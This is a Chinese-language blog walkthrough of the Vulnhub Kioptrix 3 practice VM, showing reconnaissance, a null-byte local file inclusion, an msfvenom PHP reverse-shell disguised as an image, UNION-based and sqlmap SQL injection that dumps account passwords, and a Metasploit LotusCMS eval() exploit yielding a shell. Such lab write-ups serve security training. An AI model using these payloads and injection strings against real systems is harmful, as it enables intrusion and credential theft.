<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> Vulnhub渗透测试练习-Kioptrix 3 · Uknow - Stay hungry Stay foolish</title><meta name="description" content="Vulnhub渗透测试练习-Kioptrix 3 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">Vulnhub渗透测试练习-Kioptrix 3</h1><div class="post-time">May 8, 2018</div><div class="post-content"><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>同样用<code>netdiscover</code>发现目标主机。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# netdiscover </span><br><span class="line"></span><br><span class="line"> Currently scanning: 192.168.194.0/16   |   Screen View: Unique Hosts          </span><br><span class="line">                                                                               </span><br><span class="line"> 13 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 780              </span><br><span class="line"> _____________________________________________________________________________</span><br><span class="line">   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line"> -----------------------------------------------------------------------------</span><br><span class="line"> 192.168.43.1    ac:c1:ee:31:3f:25      6     360  Xiaomi Communications Co Ltd</span><br><span class="line"> 192.168.43.33   44:03:2c:68:d8:0f      2     120  Intel Corporate             </span><br><span class="line"> 192.168.43.58   00:0c:29:b2:76:40      4     240  VMware, Inc.                </span><br><span class="line"> 192.168.43.158  00:0c:29:38:2d:6f      1      60  VMware, Inc.</span><br></pre></td></tr></table></figure>
<p>目标IP为<code>192.168.43.158</code>。</p>
<p>用nmap扫描目标主机端口信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -A -sS -n 192.168.43.158</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-08 07:45 EDT</span><br><span class="line">Nmap scan report for 192.168.43.158</span><br><span class="line">Host is up (0.00053s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)</span><br><span class="line">|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch</span><br><span class="line">|_http-title: Ligoat Security - Got Goat? Security ...</span><br><span class="line">MAC Address: 00:0C:29:38:2D:6F (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.33</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.53 ms 192.168.43.158</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 8.91 seconds</span><br></pre></td></tr></table></figure>
<p>由扫描信息可以得到</p>
<ul>
<li>22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</li>
<li>80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</li>
<li>OS details: Linux 2.6.9 - 2.6.33</li>
</ul>
<p>80端口可以看出cms为<code>Lotus CMS</code>。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_4.png" alt=""></p>
<p>用<code>dirb</code>扫描一下网站目录。也可以用御剑扫描目录。发现存在<code>phpdamin</code></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_5.png" alt=""></p>
<p>cms后台<code>http://192.168.43.158/index.php?system=Admin</code></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_6.png" alt=""></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="文件包含-amp-后台上传"><a href="#文件包含-amp-后台上传" class="headerlink" title="文件包含&amp;后台上传"></a>文件包含&amp;后台上传</h3><p>访问80端口上的WEB服务。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_1.png" alt=""></p>
<p>发现url中有点问题</p>
<p><code>http://192.168.43.158/index.php?system=Blog</code></p>
<p>尝试<code>system=../../../../../etc/passwd</code></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_2.png" alt=""></p>
<p>好像不行，尝试<code>%00.</code>截断，发现可以读到<code>/etc/passwd</code></p>
<p><code>http://192.168.43.158/index.php?system=../../../../../../../../etc/passwd%00.</code></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_3.png" alt=""></p>
<p>这里可以结合后面SQLmap跑出来的后台密码得到了一个shell。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.43.177 LPORT=443 -f raw &gt; /tmp/evil.jpg</span><br><span class="line">No platform was selected, choosing Msf::Module::Platform::PHP from the payload</span><br><span class="line">No Arch selected, selecting Arch: php from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 1114 bytes</span><br></pre></td></tr></table></figure>
<p>用<code>msfvenom</code>生成一个图片马</p>
<p>我们在后台上传图片的地方上传一个图片</p>
<p>修改已有的图片，并得到图片的名，</p>
<p>利用msf监听端口</p>
<p>利用文件包含，包含上传图片，这个地方比较鸡肋。因为这个绝对路径我们是得不到的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/index.php?system=../../../../../../../home/www/kioptrix3.com/gallery/photos/thumb_1a2o44437j.jpg%00.</span><br></pre></td></tr></table></figure>
<p>访问返回一个shell。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; set PAYLOAD php/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set LHOST 192.168.43.177</span><br><span class="line">LHOST =&gt; 192.168.43.177</span><br><span class="line">msf exploit(multi/handler) &gt; set LPORT 443</span><br><span class="line">LPORT =&gt; 443</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.43.177:443 </span><br><span class="line">[*] Sending stage (37775 bytes) to 192.168.43.158</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.43.177:443 -&gt; 192.168.43.158:51226) at 2018-05-08 12:53:09 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /home/www/kioptrix3.com</span><br><span class="line">================================</span><br><span class="line"></span><br><span class="line">Mode              Size   Type  Last modified              Name</span><br><span class="line">----              ----   ----  -------------              ----</span><br><span class="line">40777/rwxrwxrwx   4096   dir   2011-04-15 09:21:17 -0400  cache</span><br><span class="line">40777/rwxrwxrwx   4096   dir   2011-04-14 12:24:17 -0400  core</span><br><span class="line">40777/rwxrwxrwx   4096   dir   2011-04-14 12:24:17 -0400  data</span><br><span class="line">100644/rw-r--r--  23126  fil   2011-04-14 12:23:13 -0400  favicon.ico</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2011-04-14 11:32:31 -0400  gallery</span><br><span class="line">100644/rw-r--r--  26430  fil   2011-04-14 12:23:13 -0400  gnu-lgpl.txt</span><br><span class="line">100644/rw-r--r--  399    fil   2011-04-14 12:23:13 -0400  index.php</span><br><span class="line">40777/rwxrwxrwx   4096   dir   2011-04-14 12:24:17 -0400  modules</span><br><span class="line">40777/rwxrwxrwx   4096   dir   2011-04-14 12:24:17 -0400  style</span><br><span class="line">100644/rw-r--r--  243    fil   2011-04-14 12:23:13 -0400  update.php</span><br></pre></td></tr></table></figure>
<p>权限有点小，很多命令都执行不了的。</p>
<h3 id="SQLmap进行SQL注入"><a href="#SQLmap进行SQL注入" class="headerlink" title="SQLmap进行SQL注入"></a>SQLmap进行SQL注入</h3><p>这个站是有的链接有问题，302跳转到<code>kioptrix3.com</code></p>
<p>在<code>etc/passwd</code>添加</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.43.158  kioptrix3.com</span><br></pre></td></tr></table></figure>
<p><code>service networking restart</code>重启服务</p>
<p>发现url存在SQL注入。<code>kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos</code></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_7.png" alt=""></p>
<p>先用<code>sqlmap</code>进行注入测试，id存在报错注入。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_8.png" alt=""></p>
<p>尝试查找下后台管理员账号密码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: gallery                                                                              </span><br><span class="line">Table: dev_accounts</span><br><span class="line">[2 entries]</span><br><span class="line">+----+------------+---------------------------------------------+</span><br><span class="line">| id | username   | password                                    |</span><br><span class="line">+----+------------+---------------------------------------------+</span><br><span class="line">| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   |</span><br><span class="line">| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |</span><br><span class="line">+----+------------+---------------------------------------------+</span><br></pre></td></tr></table></figure>
<p>得到管理员账号密码，但是在</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_6.png" alt=""></p>
<p>无法登录，另外找到一个登录的地方<code>http://kioptrix3.com/gallery/gadmin/</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: gallery</span><br><span class="line">Table: gallarific_users</span><br><span class="line">[2 entries]</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| admin    | n0t7t1k4 |</span><br><span class="line">+----------+----------+</span><br></pre></td></tr></table></figure>
<p>但是可以登录。</p>
<p>这里虽然可以是<code>root</code>和<code>dba</code>权限，但是没有绝对路径。不能直接用sqlmap进行写shell。</p>
<h3 id="手注sqli"><a href="#手注sqli" class="headerlink" title="手注sqli"></a>手注sqli</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,2,3,4,5,6#</span><br></pre></td></tr></table></figure>
<p>判断一共有6列</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,version(),database(),4,5,6#</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_9.png" alt=""></p>
<p>得到当前数据库和版本号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,group_concat(table_name),3,4,5,6%20from%20information_schema.tables%20where%20table_schema%20=%20database()#</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_10.png" alt=""></p>
<p>得到当前数据库所有的表名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,group_concat(column_name),3,4,5,6%20FROM%20information_schema.columns%20WHERE%20table_name%20=0x6465765f6163636f756e7473#</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_11.png" alt=""></p>
<p>获取表里的列名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,group_concat(username,0x3a,password),3,4,5,6%20FROM%20dev_accounts#</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_12.png" alt=""></p>
<h3 id="Lotus-CMS-漏洞"><a href="#Lotus-CMS-漏洞" class="headerlink" title="Lotus CMS 漏洞"></a>Lotus CMS 漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit Lotus CMS</span><br><span class="line">------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                         |  Path</span><br><span class="line">                                                       | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------- ----------------------------------------</span><br><span class="line">Lotus CMS Fraise 3.0 - Local File Inclusion / Remote C | exploits/php/webapps/15964.py</span><br><span class="line">Lotus Core CMS 1.0.1 - Remote File Inclusion           | exploits/php/webapps/5866.txt</span><br><span class="line">LotusCMS 3.0 - &apos;eval()&apos; Remote Command Execution (Meta | exploits/php/remote/18565.rb</span><br><span class="line">LotusCMS 3.0.3 - Multiple Vulnerabilities              | exploits/php/webapps/16982.txt</span><br><span class="line">------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure>
<p>从查询结果看，有一个本地文件包含和一个远程代码执行，</p>
<p>这里的本地文件包含就是我们之前发现的那个。我们尝试下这个本地文件包含漏洞</p>
<p>尝试发现这个漏洞好像不行。</p>
<p>尝试<code>LotusCMS 3.0 - &#39;eval()&#39; Remote Command Execution</code> 发现是一个rb文件。</p>
<p>于是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search LotusCMS</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                              Disclosure Date  Rank       Description</span><br><span class="line">   ----                              ---------------  ----       -----------</span><br><span class="line">   exploit/multi/http/lcms_php_exec  2011-03-03       excellent  LotusCMS 3.0 eval() Remote Command Execution</span><br></pre></td></tr></table></figure>
<p>利用这个漏洞进行攻击</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/http/lcms_php_exec </span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/lcms_php_exec):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOST                     yes       The target address</span><br><span class="line">   RPORT    80               yes       The target port (TCP)</span><br><span class="line">   SSL      false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   URI      /lcms/           yes       URI</span><br><span class="line">   VHOST                     no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic LotusCMS 3.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; set RHOST 192.168.43.58</span><br><span class="line">RHOST =&gt; 192.168.43.58</span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; set PAYLOAD generic/shell_bind_tcp </span><br><span class="line">PAYLOAD =&gt; generic/shell_bind_tcp</span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; set URI /</span><br><span class="line">URi =&gt; /</span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/lcms_php_exec):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOST    192.168.43.58    yes       The target address</span><br><span class="line">   RPORT    80               yes       The target port (TCP)</span><br><span class="line">   SSL      false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   URI      /                yes       URI</span><br><span class="line">   VHOST                     no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (generic/shell_bind_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line">   RHOST  192.168.43.58    no        The target address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic LotusCMS 3.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; run </span><br><span class="line"></span><br><span class="line">[*] Started bind handler</span><br><span class="line">[-] Exploit failed [unreachable]: Rex::HostUnreachable The host (192.168.43.58:80) was unreachable.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; set RHOST 192.168.43.158</span><br><span class="line">RHOST =&gt; 192.168.43.158</span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; run </span><br><span class="line"></span><br><span class="line">[*] Started bind handler</span><br><span class="line">[*] Using found page param: /index.php?page=index</span><br><span class="line">[*] Sending exploit ...</span><br><span class="line">[*] Command shell session 1 opened (192.168.43.177:44505 -&gt; 192.168.43.158:4444) at 2018-05-08 10:02:56 -0400</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">ls</span><br><span class="line">cache</span><br><span class="line">core</span><br><span class="line">data</span><br><span class="line">favicon.ico</span><br><span class="line">gallery</span><br><span class="line">gnu-lgpl.txt</span><br><span class="line">index.php</span><br><span class="line">modules</span><br><span class="line">style</span><br><span class="line">update.php</span><br><span class="line">pwd </span><br><span class="line">/home/www/kioptrix3.com</span><br></pre></td></tr></table></figure>
<p>我尝试用<code>cd</code>命令进入<code>gallery</code>目录但是不行，</p>
<p>这里用到<code>ls -l</code>可以看到<code>gallery</code>目录的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ls -l gallery</span><br><span class="line">total 156</span><br><span class="line">drwxr-xr-x 2 root root  4096 Apr 12  2011 BACK</span><br><span class="line">-rw-r--r-- 1 root root  3573 Oct 10  2009 db.sql</span><br><span class="line">-rw-r--r-- 1 root root   252 Apr 12  2011 g.php</span><br><span class="line">drwxr-xr-x 3 root root  4096 Apr 12  2011 gadmin</span><br><span class="line">-rw-r--r-- 1 root root   214 Apr 12  2011 gallery.php</span><br><span class="line">-rw-r--r-- 1 root root  1440 Apr 14  2011 gconfig.php</span><br><span class="line">-rw-r--r-- 1 root root   297 Apr 12  2011 gfooter.php</span><br><span class="line">-rw-r--r-- 1 root root 38771 Apr 12  2011 gfunctions.php</span><br><span class="line">-rw-r--r-- 1 root root  1009 Apr 12  2011 gheader.php</span><br><span class="line">-rw-r--r-- 1 root root   249 Apr 12  2011 index.php</span><br><span class="line">-rw-r--r-- 1 root root 10340 Apr 12  2011 install.BAK</span><br><span class="line">-rw-r--r-- 1 root root   212 Apr 12  2011 login.php</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 logout.php</span><br><span class="line">-rw-r--r-- 1 root root   249 Apr 12  2011 p.php</span><br><span class="line">drwxrwxrwx 2 root root  4096 Apr 12  2011 photos</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 photos.php</span><br><span class="line">-rw-r--r-- 1 root root   219 Apr 12  2011 post_comment.php</span><br><span class="line">-rw-r--r-- 1 root root   214 Apr 12  2011 profile.php</span><br><span class="line">-rw-r--r-- 1 root root    87 Oct 10  2009 readme.html</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 recent.php</span><br><span class="line">-rw-r--r-- 1 root root   215 Apr 12  2011 register.php</span><br><span class="line">drwxr-xr-x 2 root root  4096 Apr 13  2011 scopbin</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 search.php</span><br><span class="line">-rw-r--r-- 1 root root   216 Apr 12  2011 slideshow.php</span><br><span class="line">-rw-r--r-- 1 root root   211 Apr 12  2011 tags.php</span><br><span class="line">drwxr-xr-x 6 root root  4096 Apr 12  2011 themes</span><br><span class="line">-rw-r--r-- 1 root root    56 Oct 10  2009 version.txt</span><br><span class="line">-rw-r--r-- 1 root root   211 Apr 12  2011 vote.php</span><br></pre></td></tr></table></figure>
<p>发现<code>gconfig.php</code>配置文件，<code>cat</code>读配置文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$GLOBALS[&quot;gallarific_path&quot;] = &quot;http://kioptrix3.com/gallery&quot;;</span><br><span class="line"></span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_server&quot;] = &quot;localhost&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_database&quot;] = &quot;gallery&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_username&quot;] = &quot;root&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_password&quot;] = &quot;fuckeyou&quot;;</span><br></pre></td></tr></table></figure>
<h3 id="lotusRCE-sh"><a href="#lotusRCE-sh" class="headerlink" title="lotusRCE.sh"></a>lotusRCE.sh</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/Hood3dRob1n/LotusCMS-Exploit/master/lotusRCE.sh</span><br></pre></td></tr></table></figure>
